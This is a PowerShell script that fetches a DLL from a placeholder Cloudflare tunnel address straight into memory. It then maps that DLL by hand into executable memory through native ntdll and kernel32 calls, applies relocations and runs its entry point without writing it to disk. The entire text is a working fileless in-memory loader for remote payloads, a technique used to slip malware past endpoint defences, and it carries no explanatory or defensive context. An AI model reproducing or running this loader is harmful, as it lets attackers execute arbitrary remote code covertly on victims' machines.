$u="https://CHANGE-MECHANGE-ME.trycloudflare.com/static/download/agent.dll?key=PLACEHOLDER_TOKEN"
[Net.ServicePointManager]::SecurityProtocol="Tls12"

$c=@"
using System;using System.Runtime.InteropServices;
public class R{
[DllImport("ntdll.dll")]public static extern uint NtAllocateVirtualMemory(IntPtr h,ref IntPtr b,IntPtr z,ref IntPtr s,uint t,uint p);
[DllImport("ntdll.dll")]public static extern uint NtWriteVirtualMemory(IntPtr h,IntPtr b,byte[] buf,uint sz,ref uint w);
[DllImport("ntdll.dll")]public static extern uint NtProtectVirtualMemory(IntPtr h,ref IntPtr b,ref IntPtr s,uint np,ref uint op);
[DllImport("kernel32.dll")]public static extern IntPtr GetCurrentProcess();
[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);
[DllImport("kernel32.dll")]public static extern bool VirtualProtect(IntPtr a,uint s,uint np,ref uint op);
}
"@
Add-Type $c

# Download DLL bytes directly to memory
$dll=(New-Object Net.WebClient).DownloadData($u)

# Parse PE headers
$e_lfanew=[BitConverter]::ToInt32($dll,0x3C)
$sizeOfImage=[BitConverter]::ToInt32($dll,$e_lfanew+0x50)
$entryPoint=[BitConverter]::ToInt32($dll,$e_lfanew+0x28)
$sizeOfHeaders=[BitConverter]::ToInt32($dll,$e_lfanew+0x54)
$numSections=[BitConverter]::ToInt16($dll,$e_lfanew+0x6)
$optHdrSize=[BitConverter]::ToInt16($dll,$e_lfanew+0x14)
$secHdrOffset=$e_lfanew+0x18+$optHdrSize

# Allocate memory for image
$h=[R]::GetCurrentProcess()
$baseAddr=[IntPtr]::Zero
$sz=[IntPtr]$sizeOfImage
[R]::NtAllocateVirtualMemory($h,[ref]$baseAddr,[IntPtr]::Zero,[ref]$sz,0x3000,0x40)|Out-Null

# Copy headers
[System.Runtime.InteropServices.Marshal]::Copy($dll,0,$baseAddr,$sizeOfHeaders)

# Copy sections
for($i=0;$i -lt $numSections;$i++){
    $so=$secHdrOffset+($i*40)
    $vAddr=[BitConverter]::ToInt32($dll,$so+12)
    $sizeRaw=[BitConverter]::ToInt32($dll,$so+16)
    $ptrRaw=[BitConverter]::ToInt32($dll,$so+20)
    if($sizeRaw -gt 0){
        $dest=[IntPtr]($baseAddr.ToInt64()+$vAddr)
        [System.Runtime.InteropServices.Marshal]::Copy($dll,$ptrRaw,$dest,$sizeRaw)
    }
}

# Process relocations
$relocRVA=[BitConverter]::ToInt32($dll,$e_lfanew+0xB0)
$relocSize=[BitConverter]::ToInt32($dll,$e_lfanew+0xB4)
$imageBase=[BitConverter]::ToInt64($dll,$e_lfanew+0x30)
$delta=$baseAddr.ToInt64()-$imageBase

if($relocRVA -gt 0 -and $delta -ne 0){
    $relocPtr=[IntPtr]($baseAddr.ToInt64()+$relocRVA)
    $offset=0
    while($offset -lt $relocSize){
        $pageRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32($relocPtr,$offset)
        $blockSize=[System.Runtime.InteropServices.Marshal]::ReadInt32($relocPtr,$offset+4)
        if($blockSize -eq 0){break}
        $entries=($blockSize-8)/2
        for($j=0;$j -lt $entries;$j++){
            $entry=[System.Runtime.InteropServices.Marshal]::ReadInt16($relocPtr,$offset+8+($j*2))
            $type=($entry -shr 12) -band 0xF
            $off=$entry -band 0xFFF
            if($type -eq 10){
                $addr=[IntPtr]($baseAddr.ToInt64()+$pageRVA+$off)
                $val=[System.Runtime.InteropServices.Marshal]::ReadInt64($addr)
                [System.Runtime.InteropServices.Marshal]::WriteInt64($addr,$val+$delta)
            }
        }
        $offset+=$blockSize
    }
}

# Call DllMain
$ep=[IntPtr]($baseAddr.ToInt64()+$entryPoint)
$dllMain=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ep,[Func[IntPtr,uint,IntPtr,bool]])
$dllMain.Invoke($baseAddr,1,[IntPtr]::Zero)|Out-Null
"OK"
